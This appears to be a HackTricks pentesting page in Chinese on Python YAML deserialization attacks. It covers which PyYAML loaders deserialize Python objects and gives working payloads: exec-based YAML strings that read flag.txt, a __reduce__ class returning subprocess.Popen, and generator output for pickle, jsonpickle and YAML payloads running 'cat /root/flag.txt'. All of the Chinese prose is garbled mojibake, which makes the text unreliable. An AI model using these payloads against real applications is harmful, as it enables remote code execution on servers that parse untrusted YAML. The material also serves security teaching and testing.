<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# Yaml **ååºåˆ—åŒ–**

**Yaml** pythonåº“ä¸ä»…å¯ä»¥**åºåˆ—åŒ–pythonå¯¹è±¡**ï¼Œè¿˜å¯ä»¥åºåˆ—åŒ–åŸå§‹æ•°æ®ï¼š
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
æ£€æŸ¥ä¸€ä¸‹**å…ƒç»„**ä¸æ˜¯åŸå§‹æ•°æ®ç±»å‹ï¼Œå› æ­¤å®ƒè¢«**åºåˆ—åŒ–**äº†ã€‚åŒæ ·çš„æƒ…å†µä¹Ÿå‘ç”Ÿåœ¨**range**ä¸Šï¼ˆæ¥è‡ªå†…ç½®å‡½æ•°ï¼‰ã€‚

![](<../../.gitbook/assets/image (628) (1).png>)

**safe\_load()**æˆ–**safe\_load\_all()**ä½¿ç”¨SafeLoaderï¼Œ**ä¸æ”¯æŒç±»å¯¹è±¡çš„ååºåˆ—åŒ–**ã€‚ç±»å¯¹è±¡ååºåˆ—åŒ–ç¤ºä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
å‰é¢çš„ä»£ç ä½¿ç”¨äº†**unsafe\_load**æ¥åŠ è½½åºåˆ—åŒ–çš„Pythonç±»ã€‚è¿™æ˜¯å› ä¸ºåœ¨**ç‰ˆæœ¬ >= 5.1**ä¸­ï¼Œå®ƒä¸å…è®¸ä½¿ç”¨æœªåœ¨load()ä¸­æŒ‡å®šLoaderæˆ–Loader=SafeLoaderçš„æƒ…å†µä¸‹ååºåˆ—åŒ–ä»»ä½•åºåˆ—åŒ–çš„Pythonç±»æˆ–ç±»å±æ€§ã€‚

## åŸºæœ¬åˆ©ç”¨

ä»¥ä¸‹æ˜¯å¦‚ä½•æ‰§è¡Œ**sleep**çš„ç¤ºä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
## æœªæŒ‡å®šLoaderçš„æ˜“å—æ”»å‡»çš„.load("\<content>")

æ—§ç‰ˆæœ¬çš„pyyamlåœ¨åŠ è½½å†…å®¹æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šLoaderï¼Œå°±å®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»çš„å½±å“ï¼š`yaml.load(data)`

æ‚¨å¯ä»¥åœ¨[**æ­¤å¤„æ‰¾åˆ°æœ‰å…³è¯¥æ¼æ´çš„æè¿°**](https://hackmd.io/@defund/HJZajCVlP)**ã€‚**è¯¥é¡µé¢ä¸­æå‡ºçš„**æ”»å‡»æ–¹æ³•**æ˜¯ï¼š
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
æˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨**@ishaackæä¾›çš„ä¸€è¡Œä»£ç **ï¼š
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
è¯·æ³¨æ„ï¼Œåœ¨**æœ€æ–°ç‰ˆæœ¬**ä¸­ï¼Œæ‚¨ä¸èƒ½å†**ä¸ä½¿ç”¨`Loader`**è°ƒç”¨`.load()`æ–¹æ³•ï¼Œè€Œä¸”**`FullLoader`**å¯¹æ­¤æ”»å‡»**ä¸å†å­˜åœ¨æ¼æ´**ã€‚

# RCE

è¯·æ³¨æ„ï¼Œ**ä»»ä½•Python YAMLæ¨¡å—ï¼ˆPyYAMLæˆ–ruamel.yamlï¼‰**éƒ½å¯ä»¥ä»¥**ç›¸åŒçš„æ–¹å¼**åˆ›å»ºæœ‰æ•ˆè½½è·ã€‚åŒæ ·çš„æœ‰æ•ˆè½½è·å¯ä»¥åˆ©ç”¨YAMLæ¨¡å—æˆ–åŸºäºPyYAMLæˆ–ruamel.yamlçš„ä»»ä½•æ¨¡å—ã€‚
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
## ç”¨äºåˆ›å»ºPayloadçš„å·¥å…·

å¯ä»¥ä½¿ç”¨å·¥å…·[https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)æ¥ç”ŸæˆPythonååºåˆ—åŒ–Payloadï¼Œä»¥æ»¥ç”¨**Pickleã€PyYAMLã€jsonpickleå’Œruamel.yamlï¼š**
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
# å‚è€ƒèµ„æ–™

æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´è¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»ï¼š[https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
